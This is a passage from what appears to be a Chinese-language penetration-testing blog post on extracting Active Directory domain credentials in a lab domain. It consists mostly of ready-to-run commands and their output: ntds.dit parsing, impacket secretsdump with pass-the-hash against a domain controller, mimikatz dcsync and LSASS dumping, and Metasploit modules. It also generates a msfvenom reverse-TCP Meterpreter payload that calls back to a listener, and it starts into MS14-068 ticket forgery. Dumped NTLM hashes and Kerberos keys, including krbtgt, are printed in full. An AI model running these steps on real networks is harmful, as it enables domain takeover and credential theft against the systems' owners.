root     7612  9月  4 21:15 link_table.5-rw-r--r-- 1 root root      310  9月  4 21:15 MSysDefrag2.11-rw-r--r-- 1 root root     1342  9月  4 21:15 MSysLocales.3-rw-r--r-- 1 root root   102401  9月  4 21:15 MSysObjects.0-rw-r--r-- 1 root root   102401  9月  4 21:15 MSysObjectsShadow.1-rw-r--r-- 1 root root     1826  9月  4 21:15 MSysObjids.2-rw-r--r-- 1 root root       80  9月  4 21:15 quota_rebuild_progress_table.13-rw-r--r-- 1 root root      969  9月  4 21:15 quota_table.12-rw-r--r-- 1 root root       14  9月  4 21:15 sdpropcounttable.9-rw-r--r-- 1 root root      110  9月  4 21:15 sdproptable.7-rw-r--r-- 1 root root   265165  9月  4 21:15 sd_table.8</span><br></pre></td></tr></table></figure><h4 id="02-导出散列值"><a href="#02-导出散列值" class="headerlink" title="02.导出散列值"></a>02.导出散列值</h4><p><code>安装ntdsxtract</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 setup.py build &amp;&amp; python2 setup.py install</span><br></pre></td></tr></table></figure><p><code>安装依赖包</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip2 install --upgrade pippip2 install --upgrade setuptoolspip2 install cryptohash -i https://pypi.tuna.tsinghua.edu.cn/simple/</span><br></pre></td></tr></table></figure><p><code>将ntds.dit.export与SYSTEM一起放入到ntdsxtract-master中</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/Downloads/ntdsxtract-master]└─# lsbuild           dsdeletedobjects.py   dsgroups.py  dstimeline.py  framework  ntds             README.md          setup.pydscomputers.py  dsfileinformation.py  dskeytab.py  dsusers.py     LICENSE    ntds.dit.export  release_notes.txt  SYSTEM</span><br></pre></td></tr></table></figure><p><code>导出域内所有用户名及散列值到all_user.txt中</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dsusers.py ntds.dit.export/datatable.4 ntds.dit.export/link_table.5 output --syshive SYSTEM --passwordhashes --pwdformat ocl --ntoutfile ntout --lmoutfile lmout | tee all_user.txt</span><br></pre></td></tr></table></figure><p><code>ntds.dit包含域内所有信息，导出域内计算机信息及其他信息</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dscomputers.py ntds.dit.export/datatable.4 computer_output --csvoutfile all_computers.csv</span><br></pre></td></tr></table></figure><h3 id="2-impacket工具包导出散列值"><a href="#2-impacket工具包导出散列值" class="headerlink" title="2.impacket工具包导出散列值"></a>2.impacket工具包导出散列值</h3><p><code>安装impacket</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 setup.py install</span><br></pre></td></tr></table></figure><p><code>导出ntds.dit中的所有散列值</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-secretsdump -system SYSTEM -ntds ntds.dit LOCAL</span><br></pre></td></tr></table></figure><p>z<code>结果如下</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/demo]</span><br><span class="line">└─# impacket-secretsdump -system SYSTEM -ntds ntds.dit LOCAL</span><br><span class="line">Impacket v0.9.24.dev1 - Copyright 2021 SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">[*] Target system bootKey: 0xb573c235e22349ac34c6b9fb85f04363</span><br><span class="line">[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)</span><br><span class="line">[*] Searching for pekList, be patient</span><br><span class="line">[*] PEK # 0 found and decrypted: e7ce10bc36bf8798dca6330d1b6f5c9c</span><br><span class="line">[*] Reading and decrypting hashes from ntds.dit </span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:ae0597dc61a5c66b3a0600c60044c448:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line"><span class="meta">DC$</span><span class="bash">:1000:aad3b435b51404eeaad3b435b51404ee:95785d2646d400e65856dda9b2098ef7:::</span></span><br><span class="line">krbtgt:502:aad3b435b51404eeaad3b435b51404ee:b50c75c3bccc9a1e0ba374ca414e020b:::</span><br><span class="line"><span class="meta">WIN7DC1$</span><span class="bash">:1119:aad3b435b51404eeaad3b435b51404ee:7cb84a0f8d0ea4090bc81c78d977b042:::</span></span><br><span class="line">jiye.net\win7dc1:1120:aad3b435b51404eeaad3b435b51404ee:316c43afcf1cede6f5d8aa6c2ce1b7d5:::</span><br><span class="line"><span class="meta">WIN7DC2$</span><span class="bash">:1121:aad3b435b51404eeaad3b435b51404ee:d29787a45cf23fc7eea9aba43db45573:::</span></span><br><span class="line">jiye.net\win7dc2:1122:aad3b435b51404eeaad3b435b51404ee:316c43afcf1cede6f5d8aa6c2ce1b7d5:::</span><br><span class="line">[*] Kerberos keys from ntds.dit </span><br><span class="line">Administrator:aes256-cts-hmac-sha1-96:cbf0b71442bd21aabc273f12a74291863ea7d08c01d8047a2c0f77ae7cde67cc</span><br><span class="line">Administrator:aes128-cts-hmac-sha1-96:9f70a9c7a7cda474382258797785735c</span><br><span class="line">Administrator:des-cbc-md5:fb2fd562effd3bf4</span><br><span class="line"><span class="meta">DC$</span><span class="bash">:aes256-cts-hmac-sha1-96:75a78ee4a2a233b64f011ff53db48fa698f5c5a7c334d87f846ed9c62527bc7f</span></span><br><span class="line"><span class="meta">DC$</span><span class="bash">:aes128-cts-hmac-sha1-96:95c0dcafebeed5bb96f9f047f1a87395</span></span><br><span class="line"><span class="meta">DC$</span><span class="bash">:des-cbc-md5:64df192385765e7a</span></span><br><span class="line">krbtgt:aes256-cts-hmac-sha1-96:80595e0a8851c759f9f6bafc90444d92e007ff6c42fdebfada30380fedf8d4e5</span><br><span class="line">krbtgt:aes128-cts-hmac-sha1-96:eaf969259d80eb0c6b5b42e76853bdc3</span><br><span class="line">krbtgt:des-cbc-md5:61febc5732805e40</span><br><span class="line"><span class="meta">WIN7DC1$</span><span class="bash">:aes256-cts-hmac-sha1-96:05866346f711c19c29a4d51c00b1772e597ca767ac8b150ffa3121310f3059f5</span></span><br><span class="line"><span class="meta">WIN7DC1$</span><span class="bash">:aes128-cts-hmac-sha1-96:761c738f3fd1093105eb278a6d2874ac</span></span><br><span class="line"><span class="meta">WIN7DC1$</span><span class="bash">:des-cbc-md5:52d351c845e6fed5</span></span><br><span class="line">jiye.net\win7dc1:aes256-cts-hmac-sha1-96:f9275ead3cc2a56166367723c508e91b65a6c8901a2acbe2e2a7655ac341dac2</span><br><span class="line">jiye.net\win7dc1:aes128-cts-hmac-sha1-96:f7f8736469948de9f1ab3ef2fc25e00a</span><br><span class="line">jiye.net\win7dc1:des-cbc-md5:da37203dbf4c02b9</span><br><span class="line"><span class="meta">WIN7DC2$</span><span class="bash">:aes256-cts-hmac-sha1-96:8e4af88a03181301fa67c4e0ef99c63b8d89d74e5d487295e566a06ccc1e1bae</span></span><br><span class="line"><span class="meta">WIN7DC2$</span><span class="bash">:aes128-cts-hmac-sha1-96:3ba25a6d28d57809f3f6a05269879786</span></span><br><span class="line"><span class="meta">WIN7DC2$</span><span class="bash">:des-cbc-md5:1964a1514c73e39d</span></span><br><span class="line">jiye.net\win7dc2:aes256-cts-hmac-sha1-96:f0bb35503c3d2d09d895153fcf39628d2b53476986e43a25a3b8a8a36dc5404a</span><br><span class="line">jiye.net\win7dc2:aes128-cts-hmac-sha1-96:fda04eb8d4b5a7686908c56f492bf948</span><br><span class="line">jiye.net\win7dc2:des-cbc-md5:981f852f29c876ea</span><br><span class="line">[*] Cleaning up... </span><br><span class="line">                                                                                                                                    </span><br><span class="line">┌──(root💀kali)-[~/demo]</span><br></pre></td></tr></table></figure><p><code>impacket还可以通过用户名和散列值进行验证，从远程域控制器中读取ntds.dit并转储域散列值</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-secretsdump -hashes aad3b435b51404eeaad3b435b51404ee:ae0597dc61a5c66b3a0600c60044c448 -just-dc jiye.net/Administrator@10.10.10.10</span><br></pre></td></tr></table></figure><p><code>结果如下</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">──(root💀kali)-[~/demo]</span><br><span class="line">└─# impacket-secretsdump -hashes aad3b435b51404eeaad3b435b51404ee:ae0597dc61a5c66b3a0600c60044c448 -just-dc jiye.net/Administrator@10.10.10.10</span><br><span class="line">Impacket v0.9.24.dev1 - Copyright 2021 SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)</span><br><span class="line">[*] Using the DRSUAPI method to get NTDS.DIT secrets</span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:ae0597dc61a5c66b3a0600c60044c448:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">krbtgt:502:aad3b435b51404eeaad3b435b51404ee:b50c75c3bccc9a1e0ba374ca414e020b:::</span><br><span class="line">jiye.net\win7dc1:1120:aad3b435b51404eeaad3b435b51404ee:316c43afcf1cede6f5d8aa6c2ce1b7d5:::</span><br><span class="line">jiye.net\win7dc2:1122:aad3b435b51404eeaad3b435b51404ee:316c43afcf1cede6f5d8aa6c2ce1b7d5:::</span><br><span class="line"><span class="meta">DC$</span><span class="bash">:1000:aad3b435b51404eeaad3b435b51404ee:242fc96ac0093f6ad49c36cf0f62d617:::</span></span><br><span class="line"><span class="meta">WIN7DC1$</span><span class="bash">:1119:aad3b435b51404eeaad3b435b51404ee:efc572c9a568335f411a5ce0c3bfd073:::</span></span><br><span class="line"><span class="meta">WIN7DC2$</span><span class="bash">:1121:aad3b435b51404eeaad3b435b51404ee:d29787a45cf23fc7eea9aba43db45573:::</span></span><br><span class="line">[*] Kerberos keys grabbed</span><br><span class="line">Administrator:aes256-cts-hmac-sha1-96:cbf0b71442bd21aabc273f12a74291863ea7d08c01d8047a2c0f77ae7cde67cc</span><br><span class="line">Administrator:aes128-cts-hmac-sha1-96:9f70a9c7a7cda474382258797785735c</span><br><span class="line">Administrator:des-cbc-md5:fb2fd562effd3bf4</span><br><span class="line">krbtgt:aes256-cts-hmac-sha1-96:80595e0a8851c759f9f6bafc90444d92e007ff6c42fdebfada30380fedf8d4e5</span><br><span class="line">krbtgt:aes128-cts-hmac-sha1-96:eaf969259d80eb0c6b5b42e76853bdc3</span><br><span class="line">krbtgt:des-cbc-md5:61febc5732805e40</span><br><span class="line">jiye.net\win7dc1:aes256-cts-hmac-sha1-96:f9275ead3cc2a56166367723c508e91b65a6c8901a2acbe2e2a7655ac341dac2</span><br><span class="line">jiye.net\win7dc1:aes128-cts-hmac-sha1-96:f7f8736469948de9f1ab3ef2fc25e00a</span><br><span class="line">jiye.net\win7dc1:des-cbc-md5:da37203dbf4c02b9</span><br><span class="line">jiye.net\win7dc2:aes256-cts-hmac-sha1-96:f0bb35503c3d2d09d895153fcf39628d2b53476986e43a25a3b8a8a36dc5404a</span><br><span class="line">jiye.net\win7dc2:aes128-cts-hmac-sha1-96:fda04eb8d4b5a7686908c56f492bf948</span><br><span class="line">jiye.net\win7dc2:des-cbc-md5:981f852f29c876ea</span><br><span class="line"><span class="meta">DC$</span><span class="bash">:aes256-cts-hmac-sha1-96:08470983168e2132c6af4a329fcc1ee554eee64c9bdb359e1a4e3153696701c2</span></span><br><span class="line"><span class="meta">DC$</span><span class="bash">:aes128-cts-hmac-sha1-96:cb96a8244fba00d8f31ac7ab74a3ebe7</span></span><br><span class="line"><span class="meta">DC$</span><span class="bash">:des-cbc-md5:25087a044ce631ba</span></span><br><span class="line"><span class="meta">WIN7DC1$</span><span class="bash">:aes256-cts-hmac-sha1-96:6d873f6d8dec69c829aae8393ccb0b789d78772a484de920eaac9452b2d891b9</span></span><br><span class="line"><span class="meta">WIN7DC1$</span><span class="bash">:aes128-cts-hmac-sha1-96:dd0308b5e2bf08f654c8a08e0adde90d</span></span><br><span class="line"><span class="meta">WIN7DC1$</span><span class="bash">:des-cbc-md5:45baf4bcf8386d7c</span></span><br><span class="line"><span class="meta">WIN7DC2$</span><span class="bash">:aes256-cts-hmac-sha1-96:8e4af88a03181301fa67c4e0ef99c63b8d89d74e5d487295e566a06ccc1e1bae</span></span><br><span class="line"><span class="meta">WIN7DC2$</span><span class="bash">:aes128-cts-hmac-sha1-96:3ba25a6d28d57809f3f6a05269879786</span></span><br><span class="line"><span class="meta">WIN7DC2$</span><span class="bash">:des-cbc-md5:1964a1514c73e39d</span></span><br><span class="line">[*] Cleaning up... </span><br><span class="line">                                                                                                                                    </span><br><span class="line">┌──(root💀kali)-[~/demo]</span><br><span class="line">└─# </span><br></pre></td></tr></table></figure><h3 id="3-windows下解析ntds-dit并导出域账号和域散列值"><a href="#3-windows下解析ntds-dit并导出域账号和域散列值" class="headerlink" title="3.windows下解析ntds.dit并导出域账号和域散列值"></a>3.windows下解析ntds.dit并导出域账号和域散列值</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NTDSDumpEx.exe -d ntds.dit -s SYSTEM</span><br></pre></td></tr></table></figure><h2 id="0x03-使用dcsync获取域散列值"><a href="#0x03-使用dcsync获取域散列值" class="headerlink" title="0x03.使用dcsync获取域散列值"></a>0x03.使用dcsync获取域散列值</h2><h3 id="1-mimikatz中的dcsync功能（需要域管理员权限）"><a href="#1-mimikatz中的dcsync功能（需要域管理员权限）" class="headerlink" title="1.mimikatz中的dcsync功能（需要域管理员权限）"></a>1.mimikatz中的dcsync功能（需要域管理员权限）</h3><p><code>获取所有用户名即散列值</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::dcsync /domain:jiye.net /all /csv</span><br></pre></td></tr></table></figure><p><code>结果如下</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">mimikatz # lsadump::dcsync /domain:jiye.net /all /csv</span><br><span class="line">[DC] &#x27;jiye.net&#x27; will be the domain</span><br><span class="line">[DC] &#x27;DC.jiye.net&#x27; will be the DC server</span><br><span class="line">[DC] Exporting domain &#x27;jiye.net&#x27;</span><br><span class="line">[rpc] Service  : ldap</span><br><span class="line">[rpc] AuthnSvc : GSS_NEGOTIATE (9)</span><br><span class="line">502     krbtgt  b50c75c3bccc9a1e0ba374ca414e020b        514</span><br><span class="line">1120    win7dc1 316c43afcf1cede6f5d8aa6c2ce1b7d5        66048</span><br><span class="line">1121    WIN7DC2$        d29787a45cf23fc7eea9aba43db45573        4096</span><br><span class="line">1122    win7dc2 316c43afcf1cede6f5d8aa6c2ce1b7d5        66048</span><br><span class="line">500     Administrator   ae0597dc61a5c66b3a0600c60044c448        66048</span><br><span class="line">1119    WIN7DC1$        efc572c9a568335f411a5ce0c3bfd073        4096</span><br><span class="line">1000    DC$     242fc96ac0093f6ad49c36cf0f62d617        532480</span><br><span class="line"></span><br><span class="line">mimikatz #</span><br></pre></td></tr></table></figure><p><code>获取单个用户的散列值</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::dcsync /domain:jiye.net /user:Administrator</span><br></pre></td></tr></table></figure><p><code>结果如下</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">mimikatz # lsadump::dcsync /domain:jiye.net /user:Administrator</span><br><span class="line">[DC] &#x27;jiye.net&#x27; will be the domain</span><br><span class="line">[DC] &#x27;DC.jiye.net&#x27; will be the DC server</span><br><span class="line">[DC] &#x27;Administrator&#x27; will be the user account</span><br><span class="line">[rpc] Service  : ldap</span><br><span class="line">[rpc] AuthnSvc : GSS_NEGOTIATE (9)</span><br><span class="line"></span><br><span class="line">Object RDN           : Administrator</span><br><span class="line"></span><br><span class="line">** SAM ACCOUNT **</span><br><span class="line"></span><br><span class="line">SAM Username         : Administrator</span><br><span class="line">Account Type         : 30000000 ( USER_OBJECT )</span><br><span class="line">User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )</span><br><span class="line">Account expiration   : 1601/1/1 8:00:00</span><br><span class="line">Password last change : 2021/7/10 12:13:11</span><br><span class="line">Object Security ID   : S-1-5-21-3725759035-2690766561-1621034971-500</span><br><span class="line">Object Relative ID   : 500</span><br><span class="line"></span><br><span class="line">Credentials:</span><br><span class="line">  Hash NTLM: ae0597dc61a5c66b3a0600c60044c448</span><br><span class="line"></span><br><span class="line">Supplemental Credentials:</span><br><span class="line">* Primary:NTLM-Strong-NTOWF *</span><br><span class="line">    Random Value : be5d62e6cc92a91eeb4398c6901f1af9</span><br><span class="line"></span><br><span class="line">* Primary:Kerberos-Newer-Keys *</span><br><span class="line">    Default Salt : WIN-KR84V9JAQCRAdministrator</span><br><span class="line">    Default Iterations : 4096</span><br><span class="line">    Credentials</span><br><span class="line">      aes256_hmac       (4096) : cbf0b71442bd21aabc273f12a74291863ea7d08c01d8047a2c0f77ae7cde67cc</span><br><span class="line">      aes128_hmac       (4096) : 9f70a9c7a7cda474382258797785735c</span><br><span class="line">      des_cbc_md5       (4096) : fb2fd562effd3bf4</span><br><span class="line"></span><br><span class="line">* Packages *</span><br><span class="line">    NTLM-Strong-NTOWF</span><br><span class="line"></span><br><span class="line">* Primary:Kerberos *</span><br><span class="line">    Default Salt : WIN-KR84V9JAQCRAdministrator</span><br><span class="line">    Credentials</span><br><span class="line">      des_cbc_md5       : fb2fd562effd3bf4</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mimikatz #</span><br></pre></td></tr></table></figure><p><code>转储lsass.exe进程对散列值进行Dump</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">privilege::debuglsadump::lsa /inject</span><br></pre></td></tr></table></figure><h3 id="2-Invoke-DCSync-ps1脚本"><a href="#2-Invoke-DCSync-ps1脚本" class="headerlink" title="2.Invoke-DCSync.ps1脚本"></a>2.Invoke-DCSync.ps1脚本</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .\Invoke-DCSync.ps1Invoke-DCSync -PWDumpFormat</span><br></pre></td></tr></table></figure><h2 id="0x04-使用msf获取散列值"><a href="#0x04-使用msf获取散列值" class="headerlink" title="0x04.使用msf获取散列值"></a>0x04.使用msf获取散列值</h2><h3 id="1-psexec-ntdsgrab模块"><a href="#1-psexec-ntdsgrab模块" class="headerlink" title="1.psexec_ntdsgrab模块"></a>1.psexec_ntdsgrab模块</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">msf6 auxiliary(admin/smb/psexec_ntdsgrab) &gt; options </span><br><span class="line"></span><br><span class="line">Module options (auxiliary/admin/smb/psexec_ntdsgrab):</span><br><span class="line"></span><br><span class="line">   Name                  Current Setting  Required  Description</span><br><span class="line">   ----                  ---------------  --------  -----------</span><br><span class="line">   CREATE_NEW_VSC        false            no        If true, attempts to create a volume shadow copy</span><br><span class="line">   RHOSTS                10.10.10.10      yes       The target host(s), range CIDR identifier, or hosts file with syntax &#x27;file:&lt;pa</span><br><span class="line">                                                    th&gt;&#x27;</span><br><span class="line">   RPORT                 445              yes       The SMB service port (TCP)</span><br><span class="line">   SERVICE_DESCRIPTION                    no        Service description to to be used on target for pretty listing</span><br><span class="line">   SERVICE_DISPLAY_NAME                   no        The service display name</span><br><span class="line">   SERVICE_NAME                           no        The service name</span><br><span class="line">   SMBDomain             jiye.net         no        The Windows domain to use for authentication</span><br><span class="line">   SMBPass               11               no        The password for the specified username</span><br><span class="line">   SMBSHARE              C$               yes       The name of a writeable share on the server</span><br><span class="line">   SMBUser               administrator    no        The username to authenticate as</span><br><span class="line">   VSCPATH                                no        The path to the target Volume Shadow Copy</span><br><span class="line">   WINPATH               WINDOWS          yes       The name of the Windows directory (examples: WINDOWS, WINNT)</span><br><span class="line"></span><br><span class="line">msf6 auxiliary(admin/smb/psexec_ntdsgrab) &gt; </span><br></pre></td></tr></table></figure><h3 id="2-meterpreter会话获取域账号和域散列值"><a href="#2-meterpreter会话获取域账号和域散列值" class="headerlink" title="2.meterpreter会话获取域账号和域散列值"></a>2.meterpreter会话获取域账号和域散列值</h3><p><code>生成payload</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.130 LPORT=6666 -f exe &gt; s.exe</span><br></pre></td></tr></table></figure><p><code>监听反弹shell</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(multi/handler) &gt; options </span><br><span class="line"></span><br><span class="line">Module options (exploit/multi/handler):</span><br><span class="line"></span><br><span class="line">   Name  Current Setting  Required  Description</span><br><span class="line">   ----  ---------------  --------  -----------</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (windows/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   EXITFUNC  process          yes       Exit technique (Accepted: &#x27;&#x27;, seh, thread, process, none)</span><br><span class="line">   LHOST     10.10.10.130     yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT     6666             yes       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Wildcard Target</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 exploit(multi/handler) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 10.10.10.130:6666 </span><br><span class="line">[*] Sending stage (175174 bytes) to 10.10.10.10</span><br><span class="line">[*] Meterpreter session 9 opened (10.10.10.130:6666 -&gt; 10.10.10.10:51782) at 2021-09-05 08:01:33 -0400</span><br><span class="line"></span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure><p><code>使用domain_hashdump，但是这里并没有利用成功（提示需要64位payload）</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">msf6 post(windows/gather/credentials/domain_hashdump) &gt; options </span><br><span class="line"></span><br><span class="line">Module options (post/windows/gather/credentials/domain_hashdump):</span><br><span class="line"></span><br><span class="line">   Name     Current Setting  Required  Description</span><br><span class="line">   ----     ---------------  --------  -----------</span><br><span class="line">   CLEANUP  true             yes       Automatically delete ntds backup created</span><br><span class="line">   RHOST    localhost        yes       Target address range</span><br><span class="line">   SESSION  1                yes       The session to run this module on.</span><br><span class="line">   TIMEOUT  60               yes       Timeout for WMI command in seconds</span><br><span class="line"></span><br><span class="line">msf6 post(windows/gather/credentials/domain_hashdump) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Session has Admin privs</span><br><span class="line">[*] Session is on a Domain Controller</span><br><span class="line">[-] You are running 32-bit Meterpreter on a 64 bit system</span><br><span class="line">[-] Try migrating to a 64-bit process and try again</span><br><span class="line">[*] Post module execution completed</span><br><span class="line">msf6 post(windows/gather/credentials/domain_hashdump) &gt; </span><br></pre></td></tr></table></figure><h2 id="0x05-vshadow-exe和QuarksPwDump-exe导出域账号和散列值"><a href="#0x05-vshadow-exe和QuarksPwDump-exe导出域账号和散列值" class="headerlink" title="0x05.vshadow.exe和QuarksPwDump.exe导出域账号和散列值"></a>0x05.vshadow.exe和QuarksPwDump.exe导出域账号和散列值</h2><h2 id="0x06-Kerberos域用户提权漏洞分析"><a href="#0x06-Kerberos域用户提权漏洞分析" class="headerlink" title="0x06.Kerberos域用户提权漏洞分析"></a>0x06.Kerberos域用户提权漏洞分析</h2><h3 id="1-PyKEK工具包"><a href="#1-PyKEK工具包" class="headerlink" title="1.PyKEK工具包"></a>1.PyKEK工具包</h3><p><code>查看补丁安装情况</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic qfe get hotfixid</span><br></pre></td></tr></table></figure><p><code>查看用户SID</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">whoami /user</span><br><span class="line">wmic useraccount get name,sid</span><br></pre></td></tr></table></figure><p><code>使用其中的MS14-068.exe生成高权限票据</code></p><blockquote><p>-u <userName>@<domainName>:用户名@域名。<br>-s <userSid>: 用户SID。<br>-d <domainControlerAddr>:域控制器地址。<br>-p <clearPassword>: 明文密码。<br>–rc4 